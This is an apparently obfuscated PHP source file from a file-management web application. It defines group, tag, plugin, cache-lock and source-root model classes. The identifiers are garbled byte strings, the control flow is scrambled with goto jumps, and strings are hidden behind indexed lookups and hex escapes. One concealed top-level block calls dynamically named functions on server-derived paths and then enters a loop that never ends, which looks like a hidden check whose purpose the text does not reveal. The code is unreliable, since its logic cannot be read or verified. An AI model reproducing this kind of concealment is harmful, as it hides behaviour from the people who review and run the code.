Model($a„Ú‹„¶¦©[813])->where($f¸âõÄ£³)->field($a„Ú‹„¶¦©[1816])->select(); $eª—²¬î÷ = array_to_keyvalue($eª—²¬î÷, $a„Ú‹„¶¦©[484], $a„Ú‹„¶¦©[395]); goto AÑñŞÂ‹…; c“ê´ÆáÑ: $this->where(array($a„Ú‹„¶¦©[478] => $d÷çã¡óèŸ))->save(array($a„Ú‹„¶¦©[478] => $BÕÖƒÓ•Í±)); return !0; goto CÑË»ŠòÈ; AÑñŞÂ‹…: $a˜‘‹± ¢µ = !empty($eª—²¬î÷[$d÷çã¡óèŸ]) ? $eª—²¬î÷[$d÷çã¡óèŸ] : !1; if ($a˜‘‹± ¢µ) { goto a‚¸çí¸Õ; f•î©–†: $A½ÑÖçóÎŒ = array($a„Ú‹„¶¦©[484] => $BÕÖƒÓ•Í±); Model($a„Ú‹„¶¦©[1818])->where($f¸âõÄ£³)->save($A½ÑÖçóÎŒ); Model($a„Ú‹„¶¦©[1819])->where($f¸âõÄ£³)->save($A½ÑÖçóÎŒ); goto dï»•ºí´Â; a‚¸çí¸Õ: if (!$eª—²¬î÷[$BÕÖƒÓ•Í±]) { $eª—²¬î÷[$BÕÖƒÓ•Í±] = Model($a„Ú‹„¶¦©[813])->groupRootAdd($BÕÖƒÓ•Í±); } $fóèÕ¼‡ = $eª—²¬î÷[$BÕÖƒÓ•Í±]; $f¸âõÄ£³ = array($a„Ú‹„¶¦©[478] => $a˜‘‹± ¢µ); goto C†ò´Ö’¦; F„­ôÔ‹‡»: foreach ($eª—²¬î÷ as $EƒŒ÷Œª‚‚) { $f»”¬¦ìö· = $EƒŒ÷Œª‚‚[$a„Ú‹„¶¦©[403]] == $a„Ú‹„¶¦©[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($a„Ú‹„¶¦©[813])->move($EƒŒ÷Œª‚‚[$a„Ú‹„¶¦©[395]], $fóèÕ¼‡, $f»”¬¦ìö·); } Model($a„Ú‹„¶¦©[813])->moveClearAuth = !0; $f¸âõÄ£³ = array($a„Ú‹„¶¦©[404] => 2, $a„Ú‹„¶¦©[484] => $d÷çã¡óèŸ); goto f•î©–†; C†ò´Ö’¦: $eª—²¬î÷ = Model($a„Ú‹„¶¦©[813])->where($f¸âõÄ£³)->field($a„Ú‹„¶¦©[1817])->select(); if (!$eª—²¬î÷) { $eª—²¬î÷ = array(); } Model($a„Ú‹„¶¦©[813])->moveClearAuth = !1; goto F„­ôÔ‹‡»; dï»•ºí´Â: } $this->_changeChildLevel($f»ïğô×Í‚[$d÷çã¡óèŸ], $f»ïğô×Í‚[$BÕÖƒÓ•Í±], !0); goto c“ê´ÆáÑ; BÑ¨“ª÷©: $a„Ú‹„¶¦© =& $_SERVER[ä°„ä°º]; $f¸âõÄ£³ = array($a„Ú‹„¶¦©[1720] => array($a„Ú‹„¶¦©[7], array($d÷çã¡óèŸ, $BÕÖƒÓ•Í±))); $f»ïğô×Í‚ = $this->where($f¸âõÄ£³)->select(); goto AñÒ‹ä¥×ì; AñÒ‹ä¥×ì: $f»ïğô×Í‚ = array_to_keyvalue($f»ïğô×Í‚, $a„Ú‹„¶¦©[1720]); if (!isset($f»ïğô×Í‚[$d÷çã¡óèŸ]) || !isset($f»ïğô×Í‚[$BÕÖƒÓ•Í±]) || $f»ïğô×Í‚[$d÷çã¡óèŸ][$a„Ú‹„¶¦©[478]] == 0) { return !1; } $f¸âõÄ£³ = array($a„Ú‹„¶¦©[1720] => $d÷çã¡óèŸ); goto aë¶…¶¾’±; CÑË»ŠòÈ: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($fÜÖŞ‹èµ¿) { $f¨¾‰Û¯Á =& $_SERVER[ä°„ä°º]; return array($f¨¾‰Û¯Á[1820] => array($fÜÖŞ‹èµ¿[0], $f¨¾‰Û¯Á[1821]), $f¨¾‰Û¯Á[1822] => array($fÜÖŞ‹èµ¿[0], $f¨¾‰Û¯Á[1823])); } protected function get($f«À‚´””Ì) { $Dë±›£½…¸ =& $_SERVER[ä°„ä°º]; $CÛÎœåñ£Å = Model($Dë±›£½…¸[503])->metaGet($f«À‚´””Ì, $Dë±›£½…¸[1824]); $A”ºÆÏÕ£í = json_decode($CÛÎœåñ£Å, !0); return $A”ºÆÏÕ£í ? $A”ºÆÏÕ£í : array($Dë±›£½…¸[1825] => $Dë±›£½…¸[87], $Dë±›£½…¸[367] => array()); } protected function set($EÇš—åÄ¯á, $aäÀÍ­§) { $EÁØ•ìÓÜË =& $_SERVER[ä°„ä°º]; $aäÀÍ­§ = $aäÀÍ­§ ? $aäÀÍ­§ : array($EÁØ•ìÓÜË[1825] => $EÁØ•ìÓÜË[87], $EÁØ•ìÓÜË[367] => array()); Model($EÁØ•ìÓÜË[503])->metaSet($EÇš—åÄ¯á, $EÁØ•ìÓÜË[1824], json_encode($aäÀÍ­§)); return Model($EÁØ•ìÓÜË[503])->metaSet($EÇš—åÄ¯á, $EÁØ•ìÓÜË[1824], json_encode($aäÀÍ­§)); } protected function getByTagID($eçµÇ‹ÒÔ, $fÁ½‡¶ŒŞô) { goto f™…Ç¹õÖ; báñŠ¼ò: return is_array($eë£êƒšñÇ) ? $eë£êƒšñÇ : !1; goto dÉô’†Ù; f™…Ç¹õÖ: $EŒïØ‡Ãœ =& $_SERVER[ä°„ä°º]; if (!$eçµÇ‹ÒÔ || !$fÁ½‡¶ŒŞô) { return !1; } if (!Model($EŒïØ‡Ãœ[503])->getInfoSimple($eçµÇ‹ÒÔ)) { return !1; } goto Då’¢Øµå; Då’¢Øµå: $f·Ãœ§¦Ô = $this->get($eçµÇ‹ÒÔ); if (!$f·Ãœ§¦Ô || !isset($f·Ãœ§¦Ô[$EŒïØ‡Ãœ[367]])) { return !1; } $eë£êƒšñÇ = array_find_by_field($f·Ãœ§¦Ô[$EŒïØ‡Ãœ[367]], $EŒïØ‡Ãœ[393], $fÁ½‡¶ŒŞô); goto báñŠ¼ò; dÉô’†Ù: } public function listSource($Eæµ÷«÷íÅ, $c—ºŞ’Ã¥) { goto dè³îİ‰÷; CÎ«—‰¾±¥: foreach ($A¨¾›­­ as $cÉÜ¨¦ˆ–) { if (!in_array($cÉÜ¨¦ˆ–, $A³Çé¦§¢¹)) { $d•”‹§Å”ë[] = $cÉÜ¨¦ˆ–; } } if ($d•”‹§Å”ë) { $this->removeBySource($Eæµ÷«÷íÅ, $d•”‹§Å”ë); } return $d…ßºÒ¾ö²; goto CæÇªäŒÉ×; dè³îİ‰÷: $Eí½éÂ„ =& $_SERVER[ä°„ä°º]; if ($c—ºŞ’Ã¥ && !is_array($c—ºŞ’Ã¥)) { $c—ºŞ’Ã¥ = array($c—ºŞ’Ã¥); } $e§Ú¡·Šø = $this->listData($Eæµ÷«÷íÅ); goto Dè©Ëù¬„…; Dè©Ëù¬„…: $fÕãóŸÔŸñ = array(); foreach ($e§Ú¡·Šø as $cˆòè›ÊÊ­) { $cÉÜ¨¦ˆ– = $cˆòè›ÊÊ­[$Eí½éÂ„[76]]; if (!$cÉÜ¨¦ˆ–) { continue; } if (!isset($fÕãóŸÔŸñ[$cÉÜ¨¦ˆ–])) { $fÕãóŸÔŸñ[$cÉÜ¨¦ˆ–] = array(); } $fÕãóŸÔŸñ[$cÉÜ¨¦ˆ–][] = $cˆòè›ÊÊ­[$Eí½éÂ„[419]]; } $A¨¾›­­ = array(); goto c—Óù©ê÷í; D©¹ùßïè: $C ‹ÔÌ¶È– = array_to_keyvalue($d…ßºÒ¾ö²[$Eí½éÂ„[75]], $Eí½éÂ„[33], $Eí½éÂ„[395]); $eèÌ¦À¿Äˆ = array_to_keyvalue($d…ßºÒ¾ö²[$Eí½éÂ„[74]], $Eí½éÂ„[33], $Eí½éÂ„[395]); $A³Çé¦§¢¹ = array_merge($eèÌ¦À¿Äˆ, $C ‹ÔÌ¶È–); goto CÎ«—‰¾±¥; c—Óù©ê÷í: foreach ($fÕãóŸÔŸñ as $bìõÂøÛ¶ƒ => $e¥³‰‡ùæ) { $B¢äÛ’êš¸ = !0; if (!$c—ºŞ’Ã¥) { $A¨¾›­­[] = $bìõÂøÛ¶ƒ; continue; } foreach ($c—ºŞ’Ã¥ as $eƒíÖ‚ù…†) { if (!in_array($eƒíÖ‚ù…†, $e¥³‰‡ùæ)) { $B¢äÛ’êš¸ = !1; break; } } if ($B¢äÛ’êš¸) { $A¨¾›­­[] = $bìõÂøÛ¶ƒ; } } if (!$A¨¾›­­) { return array(); } $DÆÆ’‡¥„ = array($Eí½éÂ„[410] => array($Eí½éÂ„[411], $A¨¾›­­), $Eí½éÂ„[484] => $Eæµ÷«÷íÅ, $Eí½éÂ„[404] => SourceModel::TYPE_GROUP); goto Fµí˜–Æ£Œ; Fµí˜–Æ£Œ: $d…ßºÒ¾ö² = Model($Eí½éÂ„[1227])->listSource($DÆÆ’‡¥„); if (!$d…ßºÒ¾ö² || count($A¨¾›­­) == $d…ßºÒ¾ö²[$Eí½éÂ„[364]][$Eí½éÂ„[365]]) { return $d…ßºÒ¾ö²; } $d•”‹§Å”ë = array(); goto D©¹ùßïè; CæÇªäŒÉ×: } protected function listData($A³ˆÎ«èç») { $A¬³²Äã‰ø =& $_SERVER[ä°„ä°º]; $eè—­²ğ„· = array($A¬³²Äã‰ø[1542] => 0, $A¬³²Äã‰ø[463] => array($A¬³²Äã‰ø[1826], 0), $A¬³²Äã‰ø[415] => $A¬³²Äã‰ø[1827] . $A³ˆÎ«èç»); $EàÔ Úëƒ = $A¬³²Äã‰ø[1828]; $b‡ÄÖ‚÷ = $this->field($EàÔ Úëƒ)->where($eè—­²ğ„·)->order($A¬³²Äã‰ø[1829])->select(); return $b‡ÄÖ‚÷ ? $b‡ÄÖ‚÷ : array(); } protected function addToTag($BùœÌá¢˜, $f½‰ÜÓö, $BÚŠ¤óçÑâ) { $AÛõ£‚Ç‹ =& $_SERVER[ä°„ä°º]; if (!$this->getByTagID($BùœÌá¢˜, $BÚŠ¤óçÑâ) || !$f½‰ÜÓö) { return !1; } if (!Model($AÛõ£‚Ç‹[813])->pathInfo($f½‰ÜÓö)) { return !1; } $B øİ„Ìİ = array($AÛõ£‚Ç‹[1542] => 0, $AÛõ£‚Ç‹[463] => $BÚŠ¤óçÑâ, $AÛõ£‚Ç‹[414] => $f½‰ÜÓö, $AÛõ£‚Ç‹[415] => $AÛõ£‚Ç‹[1830] . $BùœÌá¢˜, $AÛõ£‚Ç‹[413] => $AÛõ£‚Ç‹[33], $AÛõ£‚Ç‹[1724] => 0); if ($this->where($B øİ„Ìİ)->find()) { return !1; } return $this->add($B øİ„Ìİ); } protected function removeFromTag($AŸ×ğ‹£èÊ, $cÀ–Ó…§öõ, $FìğÍ’ßÔÆ) { $AÅ‚Œ¥ì²Ã =& $_SERVER[ä°„ä°º]; if (!$this->getByTagID($AŸ×ğ‹£èÊ, $FìğÍ’ßÔÆ) || !$cÀ–Ó…§öõ) { return !1; } if (is_array($cÀ–Ó…§öõ)) { $cÀ–Ó…§öõ = array($AÅ‚Œ¥ì²Ã[7], $cÀ–Ó…§öõ); } $FßÉ ¥œŒë = array($AÅ‚Œ¥ì²Ã[1542] => 0, $AÅ‚Œ¥ì²Ã[463] => $FìğÍ’ßÔÆ, $AÅ‚Œ¥ì²Ã[415] => $AÅ‚Œ¥ì²Ã[1830] . $AŸ×ğ‹£èÊ, $AÅ‚Œ¥ì²Ã[414] => $cÀ–Ó…§öõ); return $this->where($FßÉ ¥œŒë)->delete(); } protected function removeByTag($B±ò¹„ÂˆÌ, $FİàÒöòÄä) { $C§ÂëŞ”ŒÄ =& $_SERVER[ä°„ä°º]; if (!$this->getByTagID($B±ò¹„ÂˆÌ, $FİàÒöòÄä)) { return !1; } $b…Ù¤‚†êÎ = array($C§ÂëŞ”ŒÄ[1542] => 0, $C§ÂëŞ”ŒÄ[463] => $FİàÒöòÄä, $C§ÂëŞ”ŒÄ[415] => $C§ÂëŞ”ŒÄ[1830] . $B±ò¹„ÂˆÌ); return $this->where($b…Ù¤‚†êÎ)->delete(); } protected function removeBySource($CÆÓˆîÙŒš, $Fæôª¥“»È) { $E§Òô•ò«¢ =& $_SERVER[ä°„ä°º]; if (!$CÆÓˆîÙŒš || !$Fæôª¥“»È) { return !1; } if (is_array($Fæôª¥“»È)) { $Fæôª¥“»È = array($E§Òô•ò«¢[7], $Fæôª¥“»È); } $cƒ³‹øÒæ² = array($E§Òô•ò«¢[1542] => 0, $E§Òô•ò«¢[414] => $Fæôª¥“»È, $E§Òô•ò«¢[463] => array($E§Òô•ò«¢[993], 0), $E§Òô•ò«¢[415] => $E§Òô•ò«¢[1830] . $CÆÓˆîÙŒš); return $this->where($cƒ³‹øÒæ²)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x70\x6c\x75\147\151\x6e\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\x61\x74\x75\x73", "\x72\x65\x67\151\x65\163\164", "\x63\x6f\x6e\x66\151\x67"); public function loadList($cÈ‹˜´å¼§ = false) { $FÌŸÕŒœÖ = array_to_keyvalue($this->listData(), $_SERVER[ä°„ä°º][28]); if ($cÈ‹˜´å¼§) { return $FÌŸÕŒœÖ[$cÈ‹˜´å¼§]; } return $FÌŸÕŒœÖ; } public function init() { $fŒÂ‰¿†ğß =& $_SERVER[ä°„ä°º]; Hook::trigger($fŒÂ‰¿†ğß[1831]); $d™ä½³‰îí = $this->loadPluginList(); foreach ($d™ä½³‰îí as $c§«ˆÍ¦± => $E‚ªì’ƒÚ®) { $e÷»ŠÕ›Œ = $this->appAllow($c§«ˆÍ¦±, $E‚ªì’ƒÚ®); if (!$e÷»ŠÕ›Œ) { continue; } foreach ($E‚ªì’ƒÚ®[$fŒÂ‰¿†ğß[1832]] as $Fò”‹íºÕ => $EçË»î…™Ø) { Hook::bind($Fò”‹íºÕ, $EçË»î…™Ø); } } Hook::trigger($fŒÂ‰¿†ğß[1833]); Hook::trigger(ACTION); } public function appAllow($FŠ‹òÒË ”, $bÂöõ÷™, $B¤š‰ë™íÌ = true) { $c×ÀºÂ¨ =& $_SERVER[ä°„ä°º]; $F´Ô´Çœ = PLUGIN_DIR . $FŠ‹òÒË ” . $c×ÀºÂ¨[1834]; if (!is_array($bÂöõ÷™) || !is_array($bÂöõ÷™[$c×ÀºÂ¨[1832]]) || $bÂöõ÷™[$c×ÀºÂ¨[733]] != 1 || !is_file($F´Ô´Çœ)) { return !1; } if ($GLOBALS[$c×ÀºÂ¨[485]] == 1) { return !0; } if ($B¤š‰ë™íÌ && !Action($c×ÀºÂ¨[1835])->checkAuth($FŠ‹òÒË ”)) { return !1; } return !0; } public function unInstall($E©Òë¹¯ëà) { $A†Ÿçä„„ô =& $_SERVER[ä°„ä°º]; $d–·‚–…Õ = $this->loadList($E©Òë¹¯ëà); if (file_exists(PLUGIN_DIR . $E©Òë¹¯ëà)) { Hook::apply($E©Òë¹¯ëà . $A†Ÿçä„„ô[1836]); } $this->remove($d–·‚–…Õ[$A†Ÿçä„„ô[393]]); } public function changeStatus($DŸ˜ÀñÂ†×, $cÖĞÃÜÃÒÅ) { $aÊ¨ñ†øµŒ =& $_SERVER[ä°„ä°º]; $C‡è–Œ„ğ = $this->loadList($DŸ˜ÀñÂ†×); if ($cÖĞÃÜÃÒÅ) { Hook::apply($DŸ˜ÀñÂ†× . $aÊ¨ñ†øµŒ[1837]); } $this->update($C‡è–Œ„ğ[$aÊ¨ñ†øµŒ[393]], array($aÊ¨ñ†øµŒ[1838] => $cÖĞÃÜÃÒÅ)); } public function appRegist($eÎôÍØğ®, $Ešƒá± Ú) { $BŠÕ¦îò¥ =& $_SERVER[ä°„ä°º]; $BÇƒ¼µÛ¥´ = $this->loadList($eÎôÍØğ®); if ($BÇƒ¼µÛ¥´) { $this->update($BÇƒ¼µÛ¥´[$BŠÕ¦îò¥[393]], array($BŠÕ¦îò¥[1832] => $Ešƒá± Ú)); } else { $FÑ½å‡ŞŠ = array($BŠÕ¦îò¥[28] => $eÎôÍØğ®, $BŠÕ¦îò¥[1832] => $Ešƒá± Ú, $BŠÕ¦îò¥[733] => 0, $BŠÕ¦îò¥[6] => $this->getConfigDefault($eÎôÍØğ®)); $this->insert($FÑ½å‡ŞŠ); } } public function getConfigDefault($DÙ¹Î»ãƒê) { $B½ãóÇ‚˜µ =& $_SERVER[ä°„ä°º]; $DÁ­•ìÑ = array(); $Dß…ß‹÷‘ = $this->getPackageJson($DÙ¹Î»ãƒê); if (!$Dß…ß‹÷‘ && is_array($Dß…ß‹÷‘[$B½ãóÇ‚˜µ[1839]])) { return $DÁ­•ìÑ; } foreach ($Dß…ß‹÷‘[$B½ãóÇ‚˜µ[1839]] as $BÚ¥Õ†ôù½ => $a¿Ñ¾ˆàˆ—) { if (!isset($a¿Ñ¾ˆàˆ—[$B½ãóÇ‚˜µ[372]]) || isset($DÁ­•ìÑ[$BÚ¥Õ†ôù½])) { continue; } $DÁ­•ìÑ[$BÚ¥Õ†ôù½] = $a¿Ñ¾ˆàˆ—[$B½ãóÇ‚˜µ[372]]; } return $DÁ­•ìÑ; } public function getPackageJson($D”«æŸ„¡) { return Hook::apply($D”«æŸ„¡ . $_SERVER[ä°„ä°º][1840]); } public function getConfig($AÏ¤É°¤, $cë™†„É‚Ä = false) { $bçÎ”šÉËï =& $_SERVER[ä°„ä°º]; $CÏŠÄğ‰ = array(); $cëßÖ—ÒÃ = $this->loadList($AÏ¤É°¤); if ($cëßÖ—ÒÃ && is_array($cëßÖ—ÒÃ[$bçÎ”šÉËï[6]])) { $CÏŠÄğ‰ = $cëßÖ—ÒÃ[$bçÎ”šÉËï[6]]; } if (!$CÏŠÄğ‰ || $cë™†„É‚Ä) { $CÏŠÄğ‰ = $this->getConfigDefault($AÏ¤É°¤); } return $CÏŠÄğ‰; } public function setConfig($fæİ¾´ùªÈ, $D›óëòéÆ½ = false) { goto DŠ»½Êé†‡; BŠÎ¢‘ó²ï: $FÖ©†ŸÁ‚Ö = $C‘å°Ãê–™[$b÷¢¾Ü Šù[6]]; if ($D›óëòéÆ½ == !1) { $FÖ©†ŸÁ‚Ö = array(); $D›óëòéÆ½ = $this->getConfigDefault($fæİ¾´ùªÈ); } foreach ($D›óëòéÆ½ as $FéŞøñÇè× => $bÏÀôù±‹) { $FÖ©†ŸÁ‚Ö[$FéŞøñÇè×] = is_string($bÏÀôù±‹) ? trim($bÏÀôù±‹) : $bÏÀôù±‹; } goto aâØ÷³²“¼; DŠ»½Êé†‡: $b÷¢¾Ü Šù =& $_SERVER[ä°„ä°º]; $C‘å°Ãê–™ = $this->loadList($fæİ¾´ùªÈ); if (!$C‘å°Ãê–™) { return !1; } goto BŠÎ¢‘ó²ï; aâØ÷³²“¼: $this->update($C‘å°Ãê–™[$b÷¢¾Ü Šù[393]], array($b÷¢¾Ü Šù[6] => $FÖ©†ŸÁ‚Ö)); goto aèÙÊµ½‡„; aèÙÊµ½‡„: } public function viewList() { goto DŒ¶öŸ‰ĞŒ; d¥ ½èáò±: $fÂë×ÎÅ = $this->loadPluginList(); $DéÎª×”îØ = array(); foreach ($fÂë×ÎÅ as $d“Ü‹…‹œ˜ => $D³èµÆ½) { unset($D³èµÆ½[$fØÍ”½™Ş‘[1832]], $D³èµÆ½[$fØÍ”½™Ş‘[6]]); $C³±‹µŞ†“ = PLUGIN_DIR . $D³èµÆ½[$fØÍ”½™Ş‘[28]] . $fØÍ”½™Ş‘[1834]; if (!is_file($C³±‹µŞ†“)) { continue; } $Aí‰ŠÕ–‹ = Hook::apply($D³èµÆ½[$fØÍ”½™Ş‘[28]] . $fØÍ”½™Ş‘[1840]); if (is_array($Aí‰ŠÕ–‹)) { $DéÎª×”îØ[$d“Ü‹…‹œ˜] = array_merge($D³èµÆ½, $Aí‰ŠÕ–‹); } } goto ešë¹…ÔÒ¿; DŒ¶öŸ‰ĞŒ: $fØÍ”½™Ş‘ =& $_SERVER[ä°„ä°º]; $fÂë×ÎÅ = $this->loadList(); $this->pluginScan($fÂë×ÎÅ); goto d¥ ½èáò±; ešë¹…ÔÒ¿: return $DéÎª×”îØ; goto E®éìˆìï±; E®éìˆìï±: } private function loadPluginList() { $BÀ©ˆË × =& $_SERVER[ä°„ä°º]; $f”æŠÛ¶µâ = $this->loadList(); if (strtolower(MOD) == $BÀ©ˆË ×[1841]) { return $f”æŠÛ¶µâ; } $eÆóÎ…Ùß = Hook::trigger($BÀ©ˆË ×[1842], $f”æŠÛ¶µâ); if ($f”æŠÛ¶µâ && !$eÆóÎ…Ùß) { die; } return $eÆóÎ…Ùß ? $eÆóÎ…Ùß : $f”æŠÛ¶µâ; } private function pluginScan($eŒÂù¨êˆ‘) { $DÇœ¦­ƒŞ’ =& $_SERVER[ä°„ä°º]; recursion_dir(PLUGIN_DIR, $fá¹æÛ¦„¶, $C×®ùî‹¯, 0); foreach ($fá¹æÛ¦„¶ as $f“íæô‰£ğ) { $D¤•Ò„á‹¡ = get_path_this($f“íæô‰£ğ); if (isset($eŒÂù¨êˆ‘[$D¤•Ò„á‹¡]) || !file_exists($f“íæô‰£ğ . $DÇœ¦­ƒŞ’[1843]) || !file_exists($f“íæô‰£ğ . $DÇœ¦­ƒŞ’[1834])) { continue; } Hook::apply($D¤•Ò„á‹¡ . $DÇœ¦­ƒŞ’[1837]); } } } goto b–„Úƒ¿’; Cºæ»ÜˆŞÓ: class CacheLockMemcached { public function lock($e¿œ˜îÚ¦‘, $FÖÏ·Ú°ÆÏ = 0) { $a›³Ş‰¬— = Cache::init(); $Fä÷³ôÆË = microtime(!0) + $FÖÏ·Ú°ÆÏ; while (microtime(!0) < $Fä÷³ôÆË) { $D³Œµ›¥Ë³ = $a›³Ş‰¬—->get($e¿œ˜îÚ¦‘); if (!$D³Œµ›¥Ë³ || $D³Œµ›¥Ë³ < microtime(!0)) { $c‰†¬²ùä = $a›³Ş‰¬—->handle->add($e¿œ˜îÚ¦‘, $Fä÷³ôÆË, $FÖÏ·Ú°ÆÏ); if ($c‰†¬²ùä) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($CÒ±ˆ–·©) { return Cache::init()->get($CÒ±ˆ–·©); } public function unlock($aÓ·‰—ˆÂ) { return Cache::init()->remove($aÓ·‰—ˆÂ); } } class CacheLockDatabase { public function lock($DØ®¤¤³Ñì, $AÏĞ’¨‹˜ = 0) { $D”‰ó˜ÀìÈ = Model($_SERVER[ä°„ä°º][817]); $båÕ¢®£ˆ = microtime(!0) + $AÏĞ’¨‹˜; while (microtime(!0) < $båÕ¢®£ˆ) { $DÈâãÎ˜Ÿ¦ = $D”‰ó˜ÀìÈ->get($DØ®¤¤³Ñì); if (!$DÈâãÎ˜Ÿ¦ || $DÈâãÎ˜Ÿ¦ < microtime(!0)) { $eËõ“Ì„… = $D”‰ó˜ÀìÈ->set($DØ®¤¤³Ñì, $båÕ¢®£ˆ); if ($eËõ“Ì„…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eåê¥×­Â) { return Model($_SERVER[ä°„ä°º][817])->get($eåê¥×­Â); } public function unlock($DÈÑ§Šè›İ) { Model($_SERVER[ä°„ä°º][817])->remove($DÈÑ§Šè›İ); } } if (!isset($_SERVER[$_SERVER[ä°„ä°º][844]]) || !isset($_SERVER[$_SERVER[ä°„ä°º][845]])) { goto f¾·Ò¸ö’è; A˜œä¿Šî‰: $e¶Í—õ•‹ã($_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]); $F„¾ÂÑÍóã = 2; while ($F„¾ÂÑÍóã > 1) { $dŞ˜ÀÁ°±„ = rawurlencode($F„¾ÂÑÍóã . $_SERVER[ä°„ä°º][375]); } goto A‰Èƒ±èì„; c¸é‰ê¤®É: $e‚æ‘¡ïÜ­ = explode($_SERVER[ä°„ä°º][229], $b¶˜‡¦œ‹); if (count($e‚æ‘¡ïÜ­) < $_SERVER[ä°„ä°º][605]) { $c×øø¶¨ç = $_SERVER[ä°„ä°º][849]; $c×øø¶¨ç(); } $e¶Í—õ•‹ã = $_SERVER[ä°„ä°º][850]; goto A˜œä¿Šî‰; f¾·Ò¸ö’è: $B‹¤¸‰ß“ = $_SERVER[ä°„ä°º][846]; $B–„÷Ş¢éÀ = $_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]; $b¶˜‡¦œ‹ = $B‹¤¸‰ß“($B–„÷Ş¢éÀ); goto c¸é‰ê¤®É; A‰Èƒ±èì„: } goto FŠ‰°è›ô¯; e¹ºƒõçèó: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EÀÖ›—¹ŞÔ) { $E‘ÎºË“Ùœ =& $_SERVER[ä°„ä°º]; $a¢Èš»Á¶© = Model($E‘ÎºË“Ùœ[494])->where(array($E‘ÎºË“Ùœ[1542] => $EÀÖ›—¹ŞÔ))->find(); $F®‰”¿ª  = $this->_mkdirRoot(SourceModel::TYPE_USER, $EÀÖ›—¹ŞÔ, $a¢Èš»Á¶©[$E‘ÎºË“Ùœ[28]]); $this->userDesktopAdd($F®‰”¿ª ); return $F®‰”¿ª ; } public function userDesktopAdd($d„Û¯Ù®áĞ) { $fÏ”–¸Ò† =& $_SERVER[ä°„ä°º]; $AÅ–Ö ŞÎä = LNG($fÏ”–¸Ò†[1978]); $eÍÀ¿ØÉ = $this->mkdir($d„Û¯Ù®áĞ, $AÅ–Ö ŞÎä); $this->metaSet($eÍÀ¿ØÉ, $fÏ”–¸Ò†[1979], $fÏ”–¸Ò†[87]); $this->metaSet($d„Û¯Ù®áĞ, $fÏ”–¸Ò†[1980], $eÍÀ¿ØÉ); } public function groupRootAdd($FÀºï„ ¯) { $dÕ­°¤ØÅ =& $_SERVER[ä°„ä°º]; $e¨ªÊ±° = Model($dÕ­°¤ØÅ[503])->where(array($dÕ­°¤ØÅ[1798] => $FÀºï„ ¯))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $FÀºï„ ¯, $e¨ªÊ±°[$dÕ­°¤ØÅ[28]]); } public function systemRootPathAdd($d®Àñ©Â¥·) { if ($d®Àñ©Â¥· != $_SERVER[ä°„ä°º][518]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $d®Àñ©Â¥·); } public function userRootRemove($FŠÄĞÒ¥˜¬) { $c”¥·²âö = $this->sourceRoot(SourceModel::TYPE_USER, $FŠÄĞÒ¥˜¬); if (!$c”¥·²âö) { return; } $this->remove($c”¥·²âö, !1); } public function groupRootRemove($F¦÷ïàŠ¸) { $fÈİ£…ª–Œ = $this->sourceRoot(SourceModel::TYPE_GROUP, $F¦÷ïàŠ¸); if (!$fÈİ£…ª–Œ) { return; } $this->remove($fÈİ£…ª–Œ, !1); } private function _mkdirRoot($FïØãŒŒ, $bŒÈ†¨Î‘, $b¶¡ î„®ö) { goto e‰Èç›‘‚Ã; e‰Èç›‘‚Ã: $FëãùáİÜÛ =& $_SERVER[ä°„ä°º]; $cô£½Ï¡ìÌ = array($FëãùáİÜÛ[394] => 0, $FëãùáİÜÛ[562] => $FïØãŒŒ, $FëãùáİÜÛ[563] => $bŒÈ†¨Î‘, $FëãùáİÜÛ[559] => 1, $FëãùáİÜÛ[564] => USER_ID, $FëãùáİÜÛ[565] => USER_ID, $FëãùáİÜÛ[560] => $FëãùáİÜÛ[33], $FëãùáİÜÛ[566] => $FëãùáİÜÛ[512], $FëãùáİÜÛ[422] => 0, $FëãùáİÜÛ[561] => 0, $FëãùáİÜÛ[448] => 0, $FëãùáİÜÛ[567] => $FëãùáİÜÛ[33]); if ($cÔ¹‚…‚ = $this->where($cô£½Ï¡ìÌ)->find()) { return $cÔ¹‚…‚[$FëãùáİÜÛ[395]]; } goto Fò™¶ôµ³¶; Fò™¶ôµ³¶: $fª«¿´ä© = "\x4d\157\x64\x65\x6c\x53\x6f\x75\x72\x63\145\x2e\x6d\153\x64\x69\162\x52\x6f\157\164\56{$FïØãŒŒ}\56{$bŒÈ†¨Î‘}\56" . $b¶¡ î„®ö; CacheLock::lock($fª«¿´ä©); $cô£½Ï¡ìÌ[$FëãùáİÜÛ[28]] = $b¶¡ î„®ö; goto B¼ìïÕ¼; B¼ìïÕ¼: $CÁ›§àßÒ = $this->add($cô£½Ï¡ìÌ); $dÙ‹°²á® = array($FëãùáİÜÛ[568] => short_id($CÁ›§àßÒ)); $this->where(array($FëãùáİÜÛ[410] => $CÁ›§àßÒ))->save($dÙ‹°²á®); goto c’ÊÀîÜ; c’ÊÀîÜ: CacheLock::unlock($fª«¿´ä©); return $CÁ›§àßÒ; goto f«­ªñø‚Ÿ; f«­ªñø‚Ÿ: } private function sourceRoot($dºÂ ë÷‘ó, $Fò‚ÉïÏÇ, $dŒ¢ã“±¾ö = false) { $bäàóÕ³í =& $_SERVER[ä°„ä°º]; $A¿…ÊƒÙ¬ = array($bäàóÕ³í[394] => 0, $bäàóÕ³í[562] => $dºÂ ë÷‘ó, $bäàóÕ³í[563] => $Fò‚ÉïÏÇ); if ($D©Úî—´ = $this->where($A¿…ÊƒÙ¬)->find()) { return $dŒ¢ã“±¾ö ? $D©Úî—´ : $D©Úî—´[$bäàóÕ³í[395]]; } return !1; } public function sourceRootGroup($AÀä„ø•‡) { goto FºòÔÁåÎœ; b¨Íœƒ­‰ß: $this->selectPageReset(); $A™§§Ã²ˆÂ = $this->listSource($a¢†ìÄ‡šÍ, 1000); $this->selectPageRestore(); goto Bé«÷„Á²º; FºòÔÁåÎœ: $bÖùøÜìì­ =& $_SERVER[ä°„ä°º]; if (is_string($AÀä„ø•‡)) { $AÀä„ø•‡ = array($AÀä„ø•‡); 